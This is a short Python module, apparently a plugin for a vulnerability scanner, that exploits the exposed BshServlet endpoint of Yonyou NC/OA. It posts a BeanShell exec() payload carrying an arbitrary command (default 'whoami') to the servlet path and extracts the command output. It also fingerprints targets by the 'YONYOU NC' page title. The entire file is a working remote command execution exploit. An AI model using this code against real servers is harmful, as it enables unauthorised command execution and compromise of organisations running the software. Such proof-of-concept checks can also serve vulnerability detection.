# 用友OA_bshServlet命令执行
import re

from .. import requestUtil

def bsh_rce(nc_url, cmd="whoami", type="poc"):
    try:
        resp = requestUtil.post(nc_url+"/servlet/~ic/bsh.servlet.BshServlet", data={"bsh.script":'exec("%s")'%cmd})
        if "Script Output" in resp.text:
            cmd_output = re.findall('<pre>(.*?)</pre>', resp.text, re.DOTALL)[0].strip()
            if type == "poc":
                result = ["用友OA_BshServlet接口泄露", "cmd: whoami<br>output: "+cmd_output]
            else:
                result = cmd_output
        else:
            result = []

    except:
        result = []
    return result

def fingerprint(service):
    if service.title == "YONYOU NC":
        return True

def poc(service):
    return bsh_rce(service.url)
